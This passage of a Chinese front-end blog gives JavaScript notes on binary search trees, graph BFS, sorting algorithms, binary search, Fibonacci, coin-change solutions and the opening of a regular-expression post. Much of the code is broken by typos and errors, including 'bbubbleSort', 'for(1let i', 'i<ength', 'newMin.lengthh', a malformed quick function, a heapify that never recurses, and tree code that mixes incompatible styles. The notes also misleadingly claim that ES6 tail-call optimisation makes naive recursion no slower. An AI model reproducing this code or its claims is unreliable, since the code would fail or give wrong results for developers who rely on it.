class="line">    &#125;</span><br><span class="line">    return current.data;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  findMax() &#123;</span><br><span class="line">    let current = this.root;</span><br><span class="line">    while (current.right !== null) &#123;</span><br><span class="line">      current = current.right;</span><br><span class="line">    &#125;</span><br><span class="line">    return current.data;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  find(data) &#123;</span><br><span class="line">    let current = this.root;</span><br><span class="line">    while (current.data !== data) &#123;</span><br><span class="line">      if (data &lt; current.data) &#123;</span><br><span class="line">        current = current.left</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        current = current.right;</span><br><span class="line">      &#125;</span><br><span class="line">      if (current === null) &#123;</span><br><span class="line">        return null;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return current;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  isPresent(data) &#123;</span><br><span class="line">    let current = this.root;</span><br><span class="line">    while (current) &#123;</span><br><span class="line">      if (data === current.data) &#123;</span><br><span class="line">        return true;</span><br><span class="line">      &#125;</span><br><span class="line">      if (data &lt; current.data) &#123;</span><br><span class="line">        current = current.left;</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        current = current.right;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return false;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  remove(data) &#123;</span><br><span class="line">    const removeNode = function (node, data) &#123;</span><br><span class="line">      if (node == null) &#123;</span><br><span class="line">        return null;</span><br><span class="line">      &#125;</span><br><span class="line">      if (data == node.data) &#123;</span><br><span class="line">        // node没有子节点</span><br><span class="line">        if (node.left == null &amp;&amp; node.right == null) &#123;</span><br><span class="line">          return null;</span><br><span class="line">        &#125;</span><br><span class="line">        // node没有左侧子节点</span><br><span class="line">        if (node.left == null) &#123;</span><br><span class="line">          return node.right;</span><br><span class="line">        &#125;</span><br><span class="line">        // node没有右侧子节点</span><br><span class="line">        if (node.right == null) &#123;</span><br><span class="line">          return node.left;</span><br><span class="line">        &#125;</span><br><span class="line">        // node有两个子节点</span><br><span class="line">        var tempNode = node.right;</span><br><span class="line">        while (tempNode.left !== null) &#123;</span><br><span class="line">          tempNode = tempNode.left;</span><br><span class="line">        &#125;</span><br><span class="line">        node.data = tempNode.data;</span><br><span class="line">        node.right = removeNode(node.right, tempNode.data);</span><br><span class="line">        return node;</span><br><span class="line">      &#125; else if (data &lt; node.data) &#123;</span><br><span class="line">        node.left = removeNode(node.left, data);</span><br><span class="line">        return node;</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        node.right = removeNode(node.right, data);</span><br><span class="line">        return node;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    this.root = removeNode(this.root, data);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> this.inOrderTraverse = function(callback)&#123;</span><br><span class="line">  inOrderTraverseNode(root,callback);</span><br><span class="line"> &#125;</span><br><span class="line"> let inOrderTraverseNode = (node,callback)=&gt;&#123;</span><br><span class="line">  if(node!==null)&#123;</span><br><span class="line">   inOrderTraverseNode(node.left,callback);</span><br><span class="line">   callback(node.key)</span><br><span class="line">   inOrderTraverseNode(node.right,callback);</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> this.preOrderTraverse = function(callback)&#123;</span><br><span class="line">  preOrderTraverseNode(root,callback);</span><br><span class="line"> &#125;</span><br><span class="line"> let preOrderTraverseNode = (node,callback)=&gt;&#123;</span><br><span class="line">  if(node!==null)&#123;</span><br><span class="line">   callback(node.key)</span><br><span class="line">   preOrderTraverseNode(node.left,callback);</span><br><span class="line">   preOrderTraverseNode(node.right,callback);</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> this.postOrderTraverse = function(callback)&#123;</span><br><span class="line">  postOrderTraverseNode(root,callback);</span><br><span class="line"> &#125;</span><br><span class="line"> let postOrderTraverseNode = (node,callback)=&gt;&#123;</span><br><span class="line">  if(node!==null)&#123;</span><br><span class="line">   postOrderTraverseNode(node.left,callback);</span><br><span class="line">   postOrderTraverseNode(node.right,callback);</span><br><span class="line">   callback(node.key)</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> this.print = function()&#123;</span><br><span class="line">  return root;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="tu"><a href="#tu" class="headerlink" title="tu"></a>tu</h3><p><img src="../images/v2-152d0fbe33e584f155d20bdafd5b8beb_hd.jpg#id=u2CY9&originalType=binary%E2%88%B6=1&status=done&style=none"></p>
<p>Graph 是节点（或顶点）以及它们之间的连接（或边）的集合。Graph 也可以称为 Network（网络）。根据节点之间的连接是否有方向又可以分为 Directed Graph（有向图）和 Undrected Graph（无向图）。Graph 在实际生活中有很多用途，比如：导航软件计算最佳路径，社交软件进行好友推荐等等。</p>
<p>Graph 通常有两种表达方式：</p>
<p><strong>Adjaceny List（邻接列表）</strong>：</p>
<p><img src="../images/v2-3060dabcd5bf3d4fa428f7815a440c47_hd.jpg#id=ZnvpH&originalType=binary%E2%88%B6=1&status=done&style=none"></p>
<p>邻接列表可以表示为左侧是节点的列表，右侧列出它所连接的所有其他节点。</p>
<p>和 <strong>Adjacency Matrix（邻接矩阵）</strong>：</p>
<p><img src="../images/v2-c4867dcbbc78c06c435997f220ca165a_hd.jpg#id=qz67s&originalType=binary%E2%88%B6=1&status=done&style=none"></p>
<p>邻接矩阵用矩阵来表示节点之间的连接关系，每行或者每列表示一个节点，行和列的交叉处的数字表示节点之间的关系：0 表示没用连接，1 表示有连接，大于 1 表示不同的权重。</p>
<p>访问 Graph 中的节点需要使用遍历算法，遍历算法又分为广度优先和深度优先，主要用于确定目标节点和根节点之间的距离，</p>
<p>在 Javascript 中，Graph 可以用一个矩阵（二维数组）表示，广度优先搜索算法可以实现如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">bfs</span>(<span class="params">graph, root</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> nodesLen = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; graph.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    nodesLen[i] = <span class="title class_">Infinity</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  nodesLen[root] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> queue = [root];</span><br><span class="line">  <span class="keyword">var</span> current;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (queue.<span class="property">length</span> != <span class="number">0</span>) &#123;</span><br><span class="line">    current = queue.<span class="title function_">shift</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> curConnected = graph[current];</span><br><span class="line">    <span class="keyword">var</span> neighborIdx = [];</span><br><span class="line">    <span class="keyword">var</span> idx = curConnected.<span class="title function_">indexOf</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">while</span> (idx != -<span class="number">1</span>) &#123;</span><br><span class="line">      neighborIdx.<span class="title function_">push</span>(idx);</span><br><span class="line">      idx = curConnected.<span class="title function_">indexOf</span>(<span class="number">1</span>, idx + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; neighborIdx.<span class="property">length</span>; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (nodesLen[neighborIdx[j]] == <span class="title class_">Infinity</span>) &#123;</span><br><span class="line">        nodesLen[neighborIdx[j]] = nodesLen[current] + <span class="number">1</span>;</span><br><span class="line">        queue.<span class="title function_">push</span>(neighborIdx[j]);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> nodesLen;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><h3 id="排序算法"><a href="#排序算法" class="headerlink" title="排序算法"></a>排序算法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line">//冒泡O(n^2)</span><br><span class="line">bbubbleSort = (arr) =&gt;&#123;</span><br><span class="line"> let length = arr.length;</span><br><span class="line"> for(1let i = 0;i&lt;length;++i)&#123;</span><br><span class="line">  for(let j = 0;j&lt;length-1-i;++j)&#123;</span><br><span class="line">   if(arr[j]&gt;arr[j+1])&#123;</span><br><span class="line">    let temp = arr[j];</span><br><span class="line">    arr[j]=arr[j+1];</span><br><span class="line">    arr[j+1]=temp;</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">//选择O(n^2)</span><br><span class="line">selectionSort = (arr)=&gt;&#123;</span><br><span class="line"> let length = arr.length,indexMin;</span><br><span class="line"> for(let i = 0;i&lt;length-1;++i)&#123;</span><br><span class="line">  indexMin = i;</span><br><span class="line">  for(let j = i;j&lt;length;++j)&#123;</span><br><span class="line">   if(arr[indexMin]&gt;arr[j])&#123;</span><br><span class="line">    indexMin = j;</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  if(i!=indexMin)&#123;</span><br><span class="line">   let temp = arr[i];</span><br><span class="line">    arr[i]=arr[indexMin];</span><br><span class="line">    arr[indexMin]=temp;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">//插入O(n^2)，小数组比上面好</span><br><span class="line">insertionSort = (arr)=&gt;&#123;</span><br><span class="line"> let length = arr.length,j,temp;</span><br><span class="line"> for(let i = 1;i&lt;ength;++i)&#123;</span><br><span class="line">  j = i;</span><br><span class="line">  temp = arr[i]</span><br><span class="line">  while(j&gt;0&amp;&amp;arr[j-1]&gt;temp)&#123;</span><br><span class="line">   arr[j]= arr[j-1]</span><br><span class="line">   j--;</span><br><span class="line">  &#125;</span><br><span class="line">  arr[j]=temp</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">//归并O(nlogn)分治</span><br><span class="line">mergeSort = (arr) =&gt;&#123;</span><br><span class="line"> arr = mergeSortRec(arr)</span><br><span class="line">&#125;</span><br><span class="line">mergeSortRec = (arr) =&gt;&#123;</span><br><span class="line"> let length = arr.length;</span><br><span class="line"> if(length==1)&#123;</span><br><span class="line">  return arr</span><br><span class="line"> &#125;</span><br><span class="line"> let mid = Math.floor(length/2)</span><br><span class="line"> left = arr.slice(0,mid)</span><br><span class="line"> right = arr.slice(mid,length)</span><br><span class="line"> return merge(mergeSortRec(left),mergeSortRec(right))</span><br><span class="line">&#125;</span><br><span class="line">merge = (left,right) =&gt;&#123;</span><br><span class="line"> let result = [],</span><br><span class="line"> il = 0,</span><br><span class="line"> ir = 0;</span><br><span class="line"> while(il&lt;left.length&amp;&amp;ir&lt;right.length)&#123;</span><br><span class="line">  if(left[il]&lt;right[ir])&#123;</span><br><span class="line">   result.push(left[il++]);</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">   result.push(right[ir++])</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> while(il&lt;left.length)&#123;</span><br><span class="line">  result.push(left[il++]);</span><br><span class="line"> &#125;</span><br><span class="line"> while(ir&lt;right.length)&#123;</span><br><span class="line">  result.push(right[ir++])</span><br><span class="line"> &#125;</span><br><span class="line"> return result</span><br><span class="line">&#125;</span><br><span class="line">//快排O(nlogn)</span><br><span class="line">quickSort=(arr)=&gt;&#123;</span><br><span class="line"> quick(arr,0,arr.length-1)</span><br><span class="line">&#125;</span><br><span class="line">quick = (arr,left,right)&#123;</span><br><span class="line"> let index</span><br><span class="line"> if(arr.length&gt;1)&#123;</span><br><span class="line">  index = partition(arr,left,right)</span><br><span class="line">  if(left&lt;index-1)&#123;</span><br><span class="line">   quick(arr,left,index-1)</span><br><span class="line">  &#125;</span><br><span class="line">  if(index&lt;right)&#123;</span><br><span class="line">   quick(arr,index,right)</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">partition=(arr,left,right)=&gt;&#123;</span><br><span class="line"> let pivot = arr[Math.floor((right+left)/2)],</span><br><span class="line">  i=left,j=right;</span><br><span class="line"> while(i&lt;=j)&#123;</span><br><span class="line">  while(arr[i]&lt;pivot)&#123;</span><br><span class="line">   ++i;</span><br><span class="line">  &#125;</span><br><span class="line">  while(arr[j]&gt;pivot)&#123;</span><br><span class="line">   j--</span><br><span class="line">  &#125;</span><br><span class="line">  if(i&lt;=j)&#123;</span><br><span class="line">   let temp = arr[j]</span><br><span class="line">   arr[j]=arr[i]</span><br><span class="line">   arr[i] = temp</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> return i</span><br><span class="line">&#125;</span><br><span class="line">//堆排</span><br><span class="line"></span><br><span class="line">对一颗完全二叉树，作为数组，某节点i父节点为Math.floor((i-1)/2),子节点2i+1,2i+2</span><br><span class="line">let heapSort = (arr)=&gt;&#123;</span><br><span class="line"> let heapSize =arr.length;</span><br><span class="line"> buildHeap(arr)</span><br><span class="line"> while(heapSize&gt;1)&#123;</span><br><span class="line">  heapSize--;</span><br><span class="line">  [arr[0],arr[heapSize]]=[arr[heapSize],arr[0]]</span><br><span class="line">  heapify(arr,heapSize,0)</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">let buildHeap = (arr)=&gt;&#123;</span><br><span class="line"> heapSize = arr.length</span><br><span class="line"> for(let i = Math.floor(arr.length/2);i&gt;=0;i--)&#123;</span><br><span class="line">  heapify(arr,heapSize,i)</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">let heapify = (arr,heapSize,i)=&gt;&#123;</span><br><span class="line"> let left = 2*i+1,right = i*2+2,largest = i;</span><br><span class="line"> if(left&lt;heapSize &amp;&amp; arr[left]&gt;arr[largest])&#123;</span><br><span class="line">  largest = left;</span><br><span class="line"> &#125;</span><br><span class="line"> if(right&lt;heapSize &amp;&amp; arr[right]&gt;arr[largest])&#123;</span><br><span class="line">  largest = right;</span><br><span class="line"> &#125;</span><br><span class="line"> if(largest!=i)&#123;</span><br><span class="line">  [arr[i],arr[largest]]=[arr[largest],arr[i]]</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="搜索算法"><a href="#搜索算法" class="headerlink" title="搜索算法"></a>搜索算法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">//顺序</span><br><span class="line"></span><br><span class="line">//二分</span><br><span class="line">binarySearch = (arr,item)=&gt;&#123;</span><br><span class="line"> let brr = quickSort(arr)</span><br><span class="line"> let low = 0,high = brr.length -1,mid,element;</span><br><span class="line"> while(low&lt;=high)&#123;</span><br><span class="line">  mid = Math.floor((low+high)/2);</span><br><span class="line">  element = brr[mid]</span><br><span class="line">  if(element &lt;item)&#123;</span><br><span class="line">   low = mid+1;</span><br><span class="line">  &#125;else if(element &gt;item)&#123;</span><br><span class="line">   high = mid -1;</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">   return mid</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> return -1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="算法模式"><a href="#算法模式" class="headerlink" title="算法模式"></a>算法模式</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">//递归 ES6有尾调用优化，递归并不更慢</span><br><span class="line">fibonacci = (num)=&gt;&#123;</span><br><span class="line"> if(num ===1||num===2)&#123;</span><br><span class="line">  return 1</span><br><span class="line"> &#125;</span><br><span class="line"> return fibonacci(num-1)+fibonacci(num-2)</span><br><span class="line">&#125;</span><br><span class="line">fib = (num)=&gt;&#123;</span><br><span class="line"> let n1 = 1,n2=1,n=1;</span><br><span class="line"> for(let i = 3;i&lt;num;++i)&#123;</span><br><span class="line">  n = n1+n2;</span><br><span class="line">  n1=n2;</span><br><span class="line">  n2=n;</span><br><span class="line"> &#125;</span><br><span class="line"> return n</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h3><h4 id="最少硬币"><a href="#最少硬币" class="headerlink" title="最少硬币"></a>最少硬币</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">let minCoin = (coins) =&gt;&#123;</span><br><span class="line"> let cache = &#123;&#125;;</span><br><span class="line"> this.makeChange = (amount)=&gt;&#123;</span><br><span class="line">  let me = this;</span><br><span class="line">  if(!amount)&#123;</span><br><span class="line">   return [];</span><br><span class="line">  &#125;</span><br><span class="line">  if(cache[amount])&#123;</span><br><span class="line">   return cache[amount]</span><br><span class="line">  &#125;</span><br><span class="line">  let min = [],newMin,newAmount;</span><br><span class="line">  for(let i = 0;i&lt;coins.length;++i)&#123;</span><br><span class="line">   let newAmount = amount -coin,coin = coins[i];</span><br><span class="line">   if(newAmount &gt;= 0)&#123;</span><br><span class="line">    newMin = me.makeChange(newAmount);</span><br><span class="line">   &#125;</span><br><span class="line">   if(</span><br><span class="line">    newAmount&gt;=0&amp;&amp;</span><br><span class="line">    (newMin.length&lt;min.length-1||!min.length)</span><br><span class="line">    &amp;&amp;(newMin.lengthh||!newAmount)</span><br><span class="line">   )&#123;</span><br><span class="line">    min = [coin].concat(newMin);</span><br><span class="line">    console.log(min+&#x27;for&#x27;+amount)</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return (cache[amount]=min)</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="贪心"><a href="#贪心" class="headerlink" title="贪心"></a>贪心</h3><h4 id="最少硬币-1"><a href="#最少硬币-1" class="headerlink" title="最少硬币"></a>最少硬币</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function minChange(coins,amount)&#123;</span><br><span class="line"> coins = quickSort(coins)</span><br><span class="line"> let l = coins.length-1,cache = [];</span><br><span class="line"> while(l&gt;=0&amp;&amp;amount&gt;=0)&#123;</span><br><span class="line">  if(amount&gt;=coins[l])&#123;</span><br><span class="line">   cache.push(coins[l])</span><br><span class="line">   amount -=coins[l]</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">   l--</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> return cache</span><br><span class="line">&#125;</span><br><span class="line">//问题，只在相邻级别中，前一级比后一级少一半以上才可以[1,2,5,10,20,50,100],如果是[1,3,4]这种不行</span><br><span class="line">第一种从较小的硬币集合开始算，只有[1],[1,3],[1,3,4]</span><br></pre></td></tr></table></figure>

<h4 id="数组去重"><a href="#数组去重" class="headerlink" title="数组去重"></a>数组去重</h4><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/26388217">https://zhuanlan.zhihu.com/p/26388217</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.fundebug.com/2019/08/12/8-common-data-structure-and-javascript-implementation/">https://blog.fundebug.com/2019/08/12/8-common-data-structure-and-javascript-implementation/</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://catcherinsky.github.io/2021/08/26/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="CatcherInSky">
      <meta itemprop="description" content="CatcherInSky的前端知识库">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Knowlegde Bases of CatcherInSky">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/08/26/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" class="post-title-link" itemprop="url">正则表达式</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-08-26 17:47:28" itemprop="dateCreated datePublished" datetime="2021-08-26T17:47:28+08:00">2021-08-26</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-02-14 19:41:06" itemprop="dateModified" datetime="2022-02-14T19:41:06+08:00">2022-02-14</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>正则表达式，又称规则表达式。（英语：Regular Expression，在代码中常简写为 regex、RegExp 或 RE），计算机科学的一个概念。在编写处理字符串的程序或网页时，经常会有查找符合某些复杂规则的字符串的需要。正则表达式就是用于<strong>描述这些规则</strong>的工具。换句话说，正则表达式就是记录文本规则的代码。正则表达式通常被用来检索、替换那些符合某个模式(规则)的文本。<br>正则表达式是对字符串操作的一种逻辑公式，就是用事先定义好的一些特定字符、及这些特定字符的组合，组成一个“规则字符串”，这个“规则字符串”用来表达对字符串的一种过滤逻辑。<br>​</p>
<h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><p>在字符串操作中常用于：</p>
<ol>
<li> <strong>验证</strong>（给定的字符串是否符合正则表达式的过滤逻辑）</li>
</ol>
<ul>
<li>验证输入是否符合规范</li>
</ul>
<ol start="2">
<li> <strong>查找</strong>（可以通过正则表达式，从字符串中获取我们想要的特定部分）</li>
</ol>
<ul>
<li>查找所需字符段落</li>
<li>替换成自己想要的内容</li>
<li>还有一些特殊的操作</li>
</ul>
<ol start="3">
<li> 在 HTML 中可以这样使用</li>
</ol>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">  <span class="selector-tag">input</span><span class="selector-pseudo">:invalid</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">border-color</span>: red;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css">  <span class="selector-tag">input</span>,</span></span><br><span class="line"><span class="language-css">  <span class="selector-tag">input</span><span class="selector-pseudo">:valid</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">border-color</span>: <span class="number">#ccc</span>;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;tel&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;tel&quot;</span> <span class="attr">pattern</span>=<span class="string">&quot;\d&#123;11&#125;&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>

